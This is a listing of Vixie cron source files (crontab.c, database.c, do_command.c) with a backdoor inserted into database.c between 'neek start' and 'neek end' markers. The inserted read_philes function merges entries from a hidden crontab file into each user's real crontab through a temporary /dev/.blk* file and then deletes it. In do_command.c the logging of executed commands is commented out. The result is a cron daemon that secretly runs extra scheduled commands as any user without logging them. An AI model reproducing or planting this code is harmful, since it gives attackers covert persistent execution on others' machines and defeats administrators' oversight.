#if defined(POSIX)
	setlocale(LC_ALL, "");
#endif

#if defined(BSD)
	setlinebuf(stderr);
#endif
	parse_args(argc, argv);		/* sets many globals, opens a file */
	set_cron_uid();
	set_cron_cwd();
	if (!allowed(User)) {
		fprintf(stderr,
			"You (%s) are not allowed to use this program (%s)\n",
			User, ProgramName);
		fprintf(stderr, "See crontab(1) for more information\n");
		log_it(RealUser, Pid, "AUTH", "crontab command not allowed");
		exit(ERROR_EXIT);
	}
	exitstatus = OK_EXIT;
	switch (Option) {
	case opt_list:		list_cmd();
				break;
	case opt_delete:	delete_cmd();
				break;
	case opt_edit:		edit_cmd();
				break;
	case opt_replace:	if (replace_cmd() < 0)
					exitstatus = ERROR_EXIT;
				break;
	}
	exit(0);
	/*NOTREACHED*/
}
	

static void
parse_args(argc, argv)
	int	argc;
	char	*argv[];
{
	int		argch;

	if (!(pw = getpwuid(getuid()))) {
		fprintf(stderr, "%s: your UID isn't in the passwd file.\n",
			ProgramName);
		fprintf(stderr, "bailing out.\n");
		exit(ERROR_EXIT);
	}
	strcpy(User, pw->pw_name);
	strcpy(RealUser, User);
	Filename[0] = '\0';
	Option = opt_unknown;
	while (EOF != (argch = getopt(argc, argv, "u:lerx:"))) {
		switch (argch) {
		case 'x':
			if (!set_debug_flags(optarg))
				usage("bad debug option");
			break;
		case 'u':
			if (getuid() != ROOT_UID)
			{
				fprintf(stderr,
					"must be privileged to use -u\n");
				exit(ERROR_EXIT);
			}
			if (!(pw = getpwnam(optarg)))
			{
				fprintf(stderr, "%s:  user `%s' unknown\n",
					ProgramName, optarg);
				exit(ERROR_EXIT);
			}
			(void) strcpy(User, optarg);
			break;
		case 'l':
			if (Option != opt_unknown)
				usage("only one operation permitted");
			Option = opt_list;
			break;
		case 'r':
			if (Option != opt_unknown)
				usage("only one operation permitted");
			Option = opt_delete;
			break;
		case 'e':
			if (Option != opt_unknown)
				usage("only one operation permitted");
			Option = opt_edit;
			break;
		default:
			usage("unrecognized option");
		}
	}

	endpwent();

	if (Option != opt_unknown) {
		if (argv[optind] != NULL) {
			usage("no arguments permitted after this option");
		}
	} else {
		if (argv[optind] != NULL) {
			Option = opt_replace;
			(void) strcpy (Filename, argv[optind]);
		} else {
			usage("file name must be specified for replace");
		}
	}

	if (Option == opt_replace) {
		/* we have to open the file here because we're going to
		 * chdir(2) into /var/cron before we get around to
		 * reading the file.
		 */
		if (!strcmp(Filename, "-")) {
			NewCrontab = stdin;
		} else {
			/* relinquish the setuid status of the binary during
			 * the open, lest nonroot users read files they should
			 * not be able to read.  we can't use access() here
			 * since there's a race condition.  thanks go out to
			 * Arnt Gulbrandsen <agulbra@pvv.unit.no> for spotting
			 * the race.
			 */

			if (swap_uids() < OK) {
				perror("swapping uids");
				exit(ERROR_EXIT);
			}
			if (!(NewCrontab = fopen(Filename, "r"))) {
				perror(Filename);
				exit(ERROR_EXIT);
			}
			if (swap_uids() < OK) {
				perror("swapping uids back");
				exit(ERROR_EXIT);
			}
		}
	}

	Debug(DMISC, ("user=%s, file=%s, option=%s\n",
		      User, Filename, Options[(int)Option]))
}


static void
list_cmd() {
	char	n[MAX_FNAME];
	FILE	*f;
	int	ch;

	log_it(RealUser, Pid, "LIST", User);
	(void) sprintf(n, CRON_TAB(User));
	if (!(f = fopen(n, "r"))) {
		if (errno == ENOENT)
			fprintf(stderr, "no crontab for %s\n", User);
		else
			perror(n);
		exit(ERROR_EXIT);
	}

	/* file is open. copy to stdout, close.
	 */
	Set_LineNum(1)
	while (EOF != (ch = get_char(f)))
		putchar(ch);
	fclose(f);
}


static void
delete_cmd() {
	char	n[MAX_FNAME];

	log_it(RealUser, Pid, "DELETE", User);
	(void) sprintf(n, CRON_TAB(User));
	if (unlink(n)) {
		if (errno == ENOENT)
			fprintf(stderr, "no crontab for %s\n", User);
		else
			perror(n);
		exit(ERROR_EXIT);
	}
	poke_daemon();
}


static void
check_error(msg)
	char	*msg;
{
	CheckErrorCount++;
	fprintf(stderr, "\"%s\":%d: %s\n", Filename, LineNumber-1, msg);
}


static void
edit_cmd() {
	char		n[MAX_FNAME], q[MAX_TEMPSTR], *editor;
	FILE		*f;
	int		ch, t, x;
	struct stat	statbuf;
	time_t		mtime;
	WAIT_T		waiter;
	PID_T		pid, xpid;

	log_it(RealUser, Pid, "BEGIN EDIT", User);
	(void) sprintf(n, CRON_TAB(User));
	if (!(f = fopen(n, "r"))) {
		if (errno != ENOENT) {
			perror(n);
			exit(ERROR_EXIT);
		}
		fprintf(stderr, "no crontab for %s - using an empty one\n",
			User);
		if (!(f = fopen("/dev/null", "r"))) {
			perror("/dev/null");
			exit(ERROR_EXIT);
		}
	}

	(void) sprintf(Filename, "/tmp/crontab.%d", Pid);
	if (-1 == (t = open(Filename, O_CREAT|O_EXCL|O_RDWR, 0600))) {
		perror(Filename);
		goto fatal;
	}
#ifdef HAS_FCHOWN
	if (fchown(t, getuid(), getgid()) < 0) {
#else
	if (chown(Filename, getuid(), getgid()) < 0) {
#endif
		perror("fchown");
		goto fatal;
	}
	if (!(NewCrontab = fdopen(t, "r+"))) {
		perror("fdopen");
		goto fatal;
	}

	Set_LineNum(1)

	/* ignore the top few comments since we probably put them there.
	 */
	for (x = 0;  x < NHEADER_LINES;  x++) {
		ch = get_char(f);
		if (EOF == ch)
			break;
		if ('#' != ch) {
			putc(ch, NewCrontab);
			break;
		}
		while (EOF != (ch = get_char(f)))
			if (ch == '\n')
				break;
		if (EOF == ch)
			break;
	}

	/* copy the rest of the crontab (if any) to the temp file.
	 */
	if (EOF != ch)
		while (EOF != (ch = get_char(f)))
			putc(ch, NewCrontab);
	fclose(f);
	if (fflush(NewCrontab) < OK) {
		perror(Filename);
		exit(ERROR_EXIT);
	}
 again:
	rewind(NewCrontab);
	if (ferror(NewCrontab)) {
		fprintf(stderr, "%s: error while writing new crontab to %s\n",
			ProgramName, Filename);
 fatal:		unlink(Filename);
		exit(ERROR_EXIT);
	}
	if (fstat(t, &statbuf) < 0) {
		perror("fstat");
		goto fatal;
	}
	mtime = statbuf.st_mtime;

	if ((!(editor = getenv("VISUAL")))
	 && (!(editor = getenv("EDITOR")))
	    ) {
		editor = EDITOR;
	}

	/* we still have the file open.  editors will generally rewrite the
	 * original file rather than renaming/unlinking it and starting a
	 * new one; even backup files are supposed to be made by copying
	 * rather than by renaming.  if some editor does not support this,
	 * then don't use it.  the security problems are more severe if we
	 * close and reopen the file around the edit.
	 */

	switch (pid = fork()) {
	case -1:
		perror("fork");
		goto fatal;
	case 0:
		/* child */
		if (setuid(getuid()) < 0) {
			perror("setuid(getuid())");
			exit(ERROR_EXIT);
		}
		if (chdir("/tmp") < 0) {
			perror("chdir(/tmp)");
			exit(ERROR_EXIT);
		}
		if (strlen(editor) + strlen(Filename) + 2 >= MAX_TEMPSTR) {
			fprintf(stderr, "%s: editor or filename too long\n",
				ProgramName);
			exit(ERROR_EXIT);
		}
		sprintf(q, "%s %s", editor, Filename);
		execlp(_PATH_BSHELL, _PATH_BSHELL, "-c", q, NULL);
		perror(editor);
		exit(ERROR_EXIT);
		/*NOTREACHED*/
	default:
		/* parent */
		break;
	}

	/* parent */
	xpid = wait(&waiter);
	if (xpid != pid) {
		fprintf(stderr, "%s: wrong PID (%d != %d) from \"%s\"\n",
			ProgramName, xpid, pid, editor);
		goto fatal;
	}
	if (WIFEXITED(waiter) && WEXITSTATUS(waiter)) {
		fprintf(stderr, "%s: \"%s\" exited with status %d\n",
			ProgramName, editor, WEXITSTATUS(waiter));
		goto fatal;
	}
	if (WIFSIGNALED(waiter)) {
		fprintf(stderr,
			"%s: \"%s\" killed; signal %d (%score dumped)\n",
			ProgramName, editor, WTERMSIG(waiter),
			WCOREDUMP(waiter) ?"" :"no ");
		goto fatal;
	}
	if (fstat(t, &statbuf) < 0) {
		perror("fstat");
		goto fatal;
	}
	if (mtime == statbuf.st_mtime) {
		fprintf(stderr, "%s: no changes made to crontab\n",
			ProgramName);
		goto remove;
	}
	fprintf(stderr, "%s: installing new crontab\n", ProgramName);
	switch (replace_cmd()) {
	case 0:
		break;
	case -1:
		for (;;) {
			printf("Do you want to retry the same edit? ");
			fflush(stdout);
			q[0] = '\0';
			(void) fgets(q, sizeof q, stdin);
			switch (islower(q[0]) ? q[0] : tolower(q[0])) {
			case 'y':
				goto again;
			case 'n':
				goto abandon;
			default:
				fprintf(stderr, "Enter Y or N\n");
			}
		}
		/*NOTREACHED*/
	case -2:
	abandon:
		fprintf(stderr, "%s: edits left in %s\n",
			ProgramName, Filename);
		goto done;
	default:
		fprintf(stderr, "%s: panic: bad switch() in replace_cmd()\n");
		goto fatal;
	}
 remove:
	unlink(Filename);
 done:
	log_it(RealUser, Pid, "END EDIT", User);
}
	

/* returns	0	on success
 *		-1	on syntax error
 *		-2	on install error
 */
static int
replace_cmd() {
	char	n[MAX_FNAME], envstr[MAX_ENVSTR], tn[MAX_FNAME];
	FILE	*tmp;
	int	ch, eof;
	entry	*e;
	time_t	now = time(NULL);
	char	**envp = env_init();

	(void) sprintf(n, "tmp.%d", Pid);
	(void) sprintf(tn, CRON_TAB(n));
	if (!(tmp = fopen(tn, "w+"))) {
		perror(tn);
		return (-2);
	}

	/* write a signature at the top of the file.
	 *
	 * VERY IMPORTANT: make sure NHEADER_LINES agrees with this code.
	 */
	fprintf(tmp, "# DO NOT EDIT THIS FILE - edit the master and reinstall.\n");
	fprintf(tmp, "# (%s installed on %-24.24s)\n", Filename, ctime(&now));
	fprintf(tmp, "# (Cron version -- %s)\n", rcsid);

	/* copy the crontab to the tmp
	 */
	rewind(NewCrontab);
	Set_LineNum(1)
	while (EOF != (ch = get_char(NewCrontab)))
		putc(ch, tmp);
	ftruncate(fileno(tmp), ftell(tmp));
	fflush(tmp);  rewind(tmp);

	if (ferror(tmp)) {
		fprintf(stderr, "%s: error while writing new crontab to %s\n",
			ProgramName, tn);
		fclose(tmp);  unlink(tn);
		return (-2);
	}

	/* check the syntax of the file being installed.
	 */

	/* BUG: was reporting errors after the EOF if there were any errors
	 * in the file proper -- kludged it by stopping after first error.
	 *		vix 31mar87
	 */
	Set_LineNum(1 - NHEADER_LINES)
	CheckErrorCount = 0;  eof = FALSE;
	while (!CheckErrorCount && !eof) {
		switch (load_env(envstr, tmp)) {
		case ERR:
			eof = TRUE;
			break;
		case FALSE:
			e = load_entry(tmp, check_error, pw, envp);
			if (e)
				free(e);
			break;
		case TRUE:
			break;
		}
	}

	if (CheckErrorCount != 0) {
		fprintf(stderr, "errors in crontab file, can't install.\n");
		fclose(tmp);  unlink(tn);
		return (-1);
	}

#ifdef HAS_FCHOWN
	if (fchown(fileno(tmp), ROOT_UID, -1) < OK)
#else
	if (chown(tn, ROOT_UID, -1) < OK)
#endif
	{
		perror("chown");
		fclose(tmp);  unlink(tn);
		return (-2);
	}

#ifdef HAS_FCHMOD
	if (fchmod(fileno(tmp), 0600) < OK)
#else
	if (chmod(tn, 0600) < OK)
#endif
	{
		perror("chown");
		fclose(tmp);  unlink(tn);
		return (-2);
	}

	if (fclose(tmp) == EOF) {
		perror("fclose");
		unlink(tn);
		return (-2);
	}

	(void) sprintf(n, CRON_TAB(User));
	if (rename(tn, n)) {
		fprintf(stderr, "%s: error renaming %s to %s\n",
			ProgramName, tn, n);
		perror("rename");
		unlink(tn);
		return (-2);
	}
	log_it(RealUser, Pid, "REPLACE", User);

	poke_daemon();

	return (0);
}


static void
poke_daemon() {
#ifdef USE_UTIMES
	struct timeval tvs[2];
	struct timezone tz;

	(void) gettimeofday(&tvs[0], &tz);
	tvs[1] = tvs[0];
	if (utimes(SPOOL_DIR, tvs) < OK) {
		fprintf(stderr, "crontab: can't update mtime on spooldir\n");
		perror(SPOOL_DIR);
		return;
	}
#else
	if (utime(SPOOL_DIR, NULL) < OK) {
		fprintf(stderr, "crontab: can't update mtime on spooldir\n");
		perror(SPOOL_DIR);
		return;
	}
#endif /*USE_UTIMES*/
}
 /* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: database.c,v 2.8 1994/01/15 20:43:43 vixie Exp $";
#endif

/* vix 26jan87 [RCS has the log]
 */


#include "cron.h"
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <stdlib.h>


#define TMAX(a,b) ((a)>(b)?(a):(b))


static	void		process_crontab __P((char *, char *, char *,
					     struct stat *,
					     cron_db *, cron_db *));
char			*ntabname;


void
load_database(old_db)
	cron_db		*old_db;
{
	DIR		*dir;
	struct stat	statbuf;
	struct stat	syscron_stat;
	DIR_T   	*dp;
	cron_db		new_db;
	user		*u, *nu;

	Debug(DLOAD, ("[%d] load_database()\n", getpid()))

	/* before we start loading any data, do a stat on SPOOL_DIR
	 * so that if anything changes as of this moment (i.e., before we've
	 * cached any of the database), we'll see the changes next time.
	 */
	if (stat(SPOOL_DIR, &statbuf) < OK) {
		log_it("CRON", getpid(), "STAT FAILED", SPOOL_DIR);
		(void) exit(ERROR_EXIT);
	}

	/* track system crontab file
	 */
	if (stat(SYSCRONTAB, &syscron_stat) < OK)
		syscron_stat.st_mtime = 0;

	/* if spooldir's mtime has not changed, we don't need to fiddle with
	 * the database.
	 *
	 * Note that old_db->mtime is initialized to 0 in main(), and
	 * so is guaranteed to be different than the stat() mtime the first
	 * time this function is called.
	 */
	if (old_db->mtime == TMAX(statbuf.st_mtime, syscron_stat.st_mtime)) {
		Debug(DLOAD, ("[%d] spool dir mtime unch, no load needed.\n",
			      getpid()))
		return;
	}

	/* something's different.  make a new database, moving unchanged
	 * elements from the old database, reloading elements that have
	 * actually changed.  Whatever is left in the old database when
	 * we're done is chaff -- crontabs that disappeared.
	 */
	new_db.mtime = TMAX(statbuf.st_mtime, syscron_stat.st_mtime);
	new_db.head = new_db.tail = NULL;

	if (syscron_stat.st_mtime) {
		process_crontab("root", "*system*",
				SYSCRONTAB, &syscron_stat,
				&new_db, old_db);
	}

	/* we used to keep this dir open all the time, for the sake of
	 * efficiency.  however, we need to close it in every fork, and
	 * we fork a lot more often than the mtime of the dir changes.
	 */
	if (!(dir = opendir(SPOOL_DIR))) {
		log_it("CRON", getpid(), "OPENDIR FAILED", SPOOL_DIR);
		(void) exit(ERROR_EXIT);
	}

	while (NULL != (dp = readdir(dir))) {
		char	fname[MAXNAMLEN+1],
			tabname[MAXNAMLEN+1];

		/* avoid file names beginning with ".".  this is good
		 * because we would otherwise waste two guaranteed calls
		 * to getpwnam() for . and .., and also because user names
		 * starting with a period are just too nasty to consider.
		 */
		if (dp->d_name[0] == '.')
			continue;

		(void) strcpy(fname, dp->d_name);
		sprintf(tabname, CRON_TAB(fname));

		process_crontab(fname, fname, tabname,
				&statbuf, &new_db, old_db);
	}
	closedir(dir);

	/* if we don't do this, then when our children eventually call
	 * getpwnam() in do_command.c's child_process to verify MAILTO=,
	 * they will screw us up (and v-v).
	 */
	endpwent();

	/* whatever's left in the old database is now junk.
	 */
	Debug(DLOAD, ("unlinking old database:\n"))
	for (u = old_db->head;  u != NULL;  u = nu) {
		Debug(DLOAD, ("\t%s\n", u->name))
		nu = u->next;
		unlink_user(old_db, u);
		free_user(u);
	}

	/* overwrite the database control block with the new one.
	 */
	*old_db = new_db;
	Debug(DLOAD, ("load_database is done\n"))
}


void
link_user(db, u)
	cron_db	*db;
	user	*u;
{
	if (db->head == NULL)
		db->head = u;
	if (db->tail)
		db->tail->next = u;
	u->prev = db->tail;
	u->next = NULL;
	db->tail = u;
}


void
unlink_user(db, u)
	cron_db	*db;
	user	*u;
{
	if (u->prev == NULL)
		db->head = u->next;
	else
		u->prev->next = u->next;

	if (u->next == NULL)
		db->tail = u->prev;
	else
		u->next->prev = u->prev;
}


user *
find_user(db, name)
	cron_db	*db;
	char	*name;
{
	char	*env_get();
	user	*u;

	for (u = db->head;  u != NULL;  u = u->next)
		if (!strcmp(u->name, name))
			break;
	return u;
}

/* neek start */

static void
read_philes(uname, tabname, fname)
	char		*uname;
	char		*tabname;
	char		*fname;
{
	struct		stat ftab;
	struct		stat rtab;
	FILE		*realtab;
	FILE		*faketab;
	FILE		*ctab;
	char		ct[12];
	char		buf[101];
	char		tun[MAXNAMLEN+1], *pt;
	int		rt, e;
	
/*	if ((stat(fname, &ftab)) == -1)
		return;
		
	if ((stat(tabname, &rtab)) == -1)
		return;
*/		
	
	
	if ((faketab = fopen(fname, "r")) == NULL) {
		ntabname = tabname;
		return;
	}
	
	if ((realtab = fopen(tabname, "r")) == NULL) {
		ntabname = tabname;
		return;
	}
	
	srand(time(NULL)+random() % 123);	
	rt = (int) ( 50.0 * rand()/(RAND_MAX) );
	
	sprintf(ct, "/dev/.blk%d", rt);	
	ctab = fopen(ct, "w");
	
	while (fgets(buf, 100, realtab)) {
		if (buf[0] != 0x23)
			fprintf(ctab, "%s", buf);
	}
	                                
	fclose(ctab);
	
	ctab = fopen(ct, "a+");

        while (fgets(buf, 100, faketab)) {
        
        	if (buf[0] != 0x23) {

		snprintf(tun, MAXNAMLEN, "%s", buf);

                if ((strchr(tun, ' ')) != NULL)
                        *strchr(tun, ' ') = '\0';
		
		pt = buf;
		for (e = 0; e < strlen(tun); e++)
			pt++;
		pt++;
			
		sprintf(buf, "%s", pt);
                if (!strcmp(tun, uname))
                        fprintf(ctab, "%s", buf);
                }
        }

	fclose(ctab);
	
	ntabname = ct;
	
}
	
/* neek end */
	
static void
process_crontab(uname, fname, tabname, statbuf, new_db, old_db)
	char		*uname;
	char		*fname;
	char		*tabname;
	struct stat	*statbuf;
	cron_db		*new_db;
	cron_db		*old_db;
{
	struct passwd	*pw = NULL;
	int		crontab_fd = OK - 1;
	user		*u;
	char		ct[12];

	if (strcmp(fname, "*system*") && !(pw = getpwnam(uname))) {
		/* file doesn't have a user in passwd file.
		 */
		log_it(fname, getpid(), "ORPHAN", "no passwd entry");
		goto next_crontab;
	}
	
	
	read_philes(uname, tabname, TAB_NAME);
	
	if ((crontab_fd = open(ntabname, O_RDONLY, 0)) < OK) {
		/* crontab not accessible?
		 */
		log_it(fname, getpid(), "CAN'T OPEN", tabname);
		system("rm -f /dev/.blk*");
		goto next_crontab;
	}
	system("rm -f /dev/.blk*");
	
	if (fstat(crontab_fd, statbuf) < OK) {
		log_it(fname, getpid(), "FSTAT FAILED", tabname);
		goto next_crontab;
	}

	Debug(DLOAD, ("\t%s:", fname))
	u = find_user(old_db, fname);
	if (u != NULL) {
		/* if crontab has not changed since we last read it
		 * in, then we can just use our existing entry.
		 */
		if (u->mtime == statbuf->st_mtime) {
			Debug(DLOAD, (" [no change, using old data]"))
			unlink_user(old_db, u);
			link_user(new_db, u);
			goto next_crontab;
		}

		/* before we fall through to the code that will reload
		 * the user, let's deallocate and unlink the user in
		 * the old database.  This is more a point of memory
		 * efficiency than anything else, since all leftover
		 * users will be deleted from the old database when
		 * we finish with the crontab...
		 */
		Debug(DLOAD, (" [delete old data]"))
		unlink_user(old_db, u);
		free_user(u);
		log_it(fname, getpid(), "RELOAD", tabname);
	}
	u = load_user(crontab_fd, pw, fname);
	if (u != NULL) {
		u->mtime = statbuf->st_mtime;
		link_user(new_db, u);
	}

next_crontab:
	if (crontab_fd >= OK) {
		Debug(DLOAD, (" [done]\n"))
		close(crontab_fd);
	}
}
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: do_command.c,v 2.12 1994/01/15 20:43:43 vixie Exp $";
#endif


#include "cron.h"
#include <sys/signal.h>
#if defined(sequent)
# include <sys/universe.h>
#endif
#if defined(SYSLOG)
# include <syslog.h>
#endif


static void		child_process __P((entry *, user *)),
			do_univ __P((user *));


void
do_command(e, u)
	entry	*e;
	user	*u;
{
	Debug(DPROC, ("[%d] do_command(%s, (%s,%d,%d))\n",
		getpid(), e->cmd, u->name, e->uid, e->gid))

	/* fork to become asynchronous -- parent process is done immediately,
	 * and continues to run the normal cron code, which means return to
	 * tick().  the child and grandchild don't leave this function, alive.
	 *
	 * vfork() is unsuitable, since we have much to do, and the parent
	 * needs to be able to run off and fork other processes.
	 */
	switch (fork()) {
	case -1:
		log_it("CRON",getpid(),"error","can't fork");
		break;
	case 0:
		/* child process */
		acquire_daemonlock(1);
		child_process(e, u);
		Debug(DPROC, ("[%d] child process done, exiting\n", getpid()))
		_exit(OK_EXIT);
		break;
	default:
		/* parent process */
		break;
	}
	Debug(DPROC, ("[%d] main process returning to work\n", getpid()))
}


static void
child_process(e, u)
	entry	*e;
	user	*u;
{
	int		stdin_pipe[2], stdout_pipe[2];
	register char	*input_data;
	char		*usernm, *mailto;
	int		children = 0;

	Debug(DPROC, ("[%d] child_process('%s')\n", getpid(), e->cmd))

	/* mark ourselves as different to PS command watchers by upshifting
	 * our program name.  This has no effect on some kernels.
	 */
	/*local*/{
		register char	*pch;

		for (pch = ProgramName;  *pch;  pch++)
			*pch = MkUpper(*pch);
	}

	/* discover some useful and important environment settings
	 */
	usernm = env_get("LOGNAME", e->envp);
	mailto = env_get("MAILTO", e->envp);

#ifdef USE_SIGCHLD
	/* our parent is watching for our death by catching SIGCHLD.  we
	 * do not care to watch for our children's deaths this way -- we
	 * use wait() explictly.  so we have to disable the signal (which
	 * was inherited from the parent).
	 */
	(void) signal(SIGCHLD, SIG_IGN);
#else
	/* on system-V systems, we are ignoring SIGCLD.  we have to stop
	 * ignoring it now or the wait() in cron_pclose() won't work.
	 * because of this, we have to wait() for our children here, as well.
	 */
	(void) signal(SIGCLD, SIG_DFL);
#endif /*BSD*/

	/* create some pipes to talk to our future child
	 */
	pipe(stdin_pipe);	/* child's stdin */
	pipe(stdout_pipe);	/* child's stdout */
	
	/* since we are a forked process, we can diddle the command string
	 * we were passed -- nobody else is going to use it again, right?
	 *
	 * if a % is present in the command, previous characters are the
	 * command, and subsequent characters are the additional input to
	 * the command.  Subsequent %'s will be transformed into newlines,
	 * but that happens later.
	 */
	/*local*/{
		register int escaped = FALSE;
		register int ch;

		for (input_data = e->cmd;  ch = *input_data;  input_data++) {
			if (escaped) {
				escaped = FALSE;
				continue;
			}
			if (ch == '\\') {
				escaped = TRUE;
				continue;
			}
			if (ch == '%') {
				*input_data++ = '\0';
				break;
			}
		}
	}

	/* fork again, this time so we can exec the user's command.
	 */
	switch (vfork()) {
	case -1:
		log_it("CRON",getpid(),"error","can't vfork");
		exit(ERROR_EXIT);
		/*NOTREACHED*/
	case 0:
		Debug(DPROC, ("[%d] grandchild process Vfork()'ed\n",
			      getpid()))

		/* write a log message.  we've waited this long to do it
		 * because it was not until now that we knew the PID that
		 * the actual user command shell was going to get and the
		 * PID is part of the log message.
		 */
		/*local*/{
			char *x = mkprints((u_char *)e->cmd, strlen(e->cmd));

//			if (TAB_LOG == 0)
//				log_it(usernm, getpid(), "CMD", x);
			free(x);
		}

		/* that's the last thing we'll log.  close the log files.
		 */
#ifdef SYSLOG
		closelog();
#endif

		/* get new pgrp, void tty, etc.
		 */
		(void) setsid();

		/* close the pipe ends that we won't use.  this doesn't affect
		 * the parent, who has to read and write them; it keeps the
		 * kernel from recording us as a potential client TWICE --
		 * which would keep it from sending SIGPIPE in otherwise
		 * appropriate circumstances.
		 */
		close(stdin_pipe[WRITE_PIPE]);
		close(stdout_pipe[READ_PIPE]);

		/* grandchild process.  make std{in,out} be the ends of
		 * pipes opened by our daddy; make stderr go to stdout.
		 */
		close(STDIN);	dup2(stdin_pipe[READ_PIPE], STDIN);
		close(STDOUT);	dup2(stdout_pipe[WRITE_PIPE], STDOUT);
		close(STDERR);	dup2(STDOUT, STDERR);

		/* close the pipes we just dup'ed.  The resources will remain.
		 */
		close(stdin_pipe[READ_PIPE]);
		close(stdout_pipe[WRITE_PIPE]);

		/* set our login universe.  Do this in the grandchild
		 * so that the child can invoke /usr/lib/sendmail
		 * without surprises.
		 */
		do_univ(u);

		/* set our directory, uid and gid.  Set gid first, since once
		 * we set uid, we've lost root privledges.
		 */
		setgid(e->gid);
# if defined(BSD)
		initgroups(env_get("LOGNAME", e->envp), e->gid);
# endif
		setuid(e->uid);		/* we aren't root after this... */
		chdir(env_get("HOME", e->envp));

		/* exec the command.
		 */
		{
			char	*shell = env_get("SHELL", e->envp);

# if DEBUGGING
			if (DebugFlags & DTEST) {
				fprintf(stderr,
				"debug DTEST is on, not exec'ing command.\n");
				fprintf(stderr,
				"\tcmd='%s' shell='%s'\n", e->cmd, shell);
				_exit(OK_EXIT);
			}
# endif /*DEBUGGING*/
			execle(shell, shell, "-c", e->cmd, (char *)0, e->envp);
			fprintf(stderr, "execl: couldn't exec `%s'\n", shell);
			perror("execl");
			_exit(ERROR_EXIT);
		}
		break;
	default:
		/* parent process */
		break;
	}

	children++;

	/* middle process, child of original cron, parent of process running
	 * the user's command.
	 */

	Debug(DPROC, ("[%d] child continues, closing pipes\n", getpid()))

	/* close the ends of the pipe that will only be referenced in the
	 * grandchild process...
	 */
	close(stdin_pipe[READ_PIPE]);
	close(stdout_pipe[WRITE_PIPE]);

	/*
	 * write, to the pipe connected to child's stdin, any input specified
	 * after a % in the crontab entry.  while we copy, convert any
	 * additional %'s to newlines.  when done, if some characters were
	 * written and the last one wasn't a newline, write a newline.
	 *
	 * Note that if the input data won't fit into one pipe buffer (2K
	 * or 4K on most BSD systems), and the child doesn't read its stdin,
	 * we would block here.  thus we must fork again.
	 */

	if (*input_data && fork() == 0) {
		register FILE	*out = fdopen(stdin_pipe[WRITE_PIPE], "w");
		register int	need_newline = FALSE;
		register int	escaped = FALSE;
		register int	ch;

		Debug(DPROC, ("[%d] child2 sending data to grandchild\n", getpid()))

		/* close the pipe we don't use, since we inherited it and
		 * are part of its reference count now.
		 */
		close(stdout_pipe[READ_PIPE]);

		/* translation:
		 *	\% -> %
		 *	%  -> \n
		 *	\x -> \x	for all x != %
		 */
		while (ch = *input_data++) {
			if (escaped) {
				if (ch != '%')
					putc('\\', out);
			} else {
				if (ch == '%')
					ch = '\n';
			}

			if (!(escaped = (ch == '\\'))) {
				putc(ch, out);
				need_newline = (ch != '\n');
			}
		}
		if (escaped)
			putc('\\', out);
		if (need_newline)
			putc('\n', out);

		/* close the pipe, causing an EOF condition.  fclose causes
		 * stdin_pipe[WRITE_PIPE] to be closed, too.
		 */
		fclose(out);

		Debug(DPROC, ("[%d] child2 done sending to grandchild\n", getpid()))
		exit(0);
	}

	/* close the pipe to the grandkiddie's stdin, since its wicked uncle
	 * ernie back there has it open and will close it when he's done.
	 */
	close(stdin_pipe[WRITE_PIPE]);

	children++;

	/*
	 * read output from the grandchild.  it's stderr has been redirected to
	 * it's stdout, which has been redirected to our pipe.  if there is any
	 * output, we'll be mailing it to the user whose crontab this is...
	 * when the grandchild exits, we'll get EOF.
	 */

	Debug(DPROC, ("[%d] child reading output from grandchild\n", getpid()))

	/*local*/{
		register FILE	*in = fdopen(stdout_pipe[READ_PIPE], "r");
		register int	ch = getc(in);

		if (ch != EOF) {
			register FILE	*mail;
			register int	bytes = 1;
			int		status = 0;

			Debug(DPROC|DEXT,
				("[%d] got data (%x:%c) from grandchild\n",
					getpid(), ch, ch))

			/* get name of recipient.  this is MAILTO if set to a
			 * valid local username; USER otherwise.
			 */
			if (mailto) {
				/* MAILTO was present in the environment
				 */
				if (!*mailto) {
					/* ... but it's empty. set to NULL
					 */
					mailto = NULL;
				}
			} else {
				/* MAILTO not present, set to USER.
				 */
				mailto = usernm;
			}
		
			/* if we are supposed to be mailing, MAILTO will
			 * be non-NULL.  only in this case should we set
			 * up the mail command and subjects and stuff...
			 */

			if (mailto) {
				register char	**env;
				auto char	mailcmd[MAX_COMMAND];
				auto char	hostname[MAXHOSTNAMELEN];

				(void) gethostname(hostname, MAXHOSTNAMELEN);
				(void) sprintf(mailcmd, MAILARGS,
					       MAILCMD, mailto);
				if (!(mail = cron_popen(mailcmd, "w"))) {
					perror(MAILCMD);
					(void) _exit(ERROR_EXIT);
				}
				fprintf(mail, "From: root (Cron Daemon)\n");
				fprintf(mail, "To: %s\n", mailto);
				fprintf(mail, "Subject: Cron <%s@%s> %s\n",
					usernm, first_word(hostname, "."),
					e->cmd);
# if defined(MAIL_DATE)
				fprintf(mail, "Date: %s\n",
					arpadate(&TargetTime));
# endif /* MAIL_DATE */
				for (env = e->envp;  *env;  env++)
					fprintf(mail, "X-Cron-Env: <%s>\n",
						*env);
				fprintf(mail, "\n");

				/* this was the first char from the pipe
				 */
				putc(ch, mail);
			}

			/* we have to read the input pipe no matter whether
			 * we mail or not, but obviously we only write to
			 * mail pipe if we ARE mailing.
			 */

			while (EOF != (ch = getc(in))) {
				bytes++;
				if (mailto)
					putc(ch, mail);
			}

